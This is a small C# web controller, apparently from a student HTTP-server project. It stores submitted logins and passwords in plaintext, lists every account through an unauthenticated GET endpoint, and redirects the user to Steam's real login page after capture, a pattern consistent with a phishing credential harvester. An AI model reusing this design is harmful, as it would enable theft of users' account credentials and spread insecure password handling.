using HttpServer2.Attributes;
using HttpServer2.Models;
using HttpServer2.ServerResponse;
using System.Collections.Generic;
using System.Net;

namespace HttpServer2.Controllers
{
    [ApiController]
    public class DAOAccounts
    {
        IAccountsDAO _accountsDAO = new AccountsDAO();

        [HttpGET("/")]
        public IEnumerable<Account> GetAccounts()
            => _accountsDAO.GetAll();

        [HttpGET("/{id}")]
        public Account? GetAccountById(int id)
            => _accountsDAO.GetById(id);

        [HttpPOST("/")]
        public IControllerResult PostAccounts(string login, string password, HttpListenerResponse response)
        {
            _accountsDAO.Create(new Account { Login = login, Password = password });

            return new Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }
}
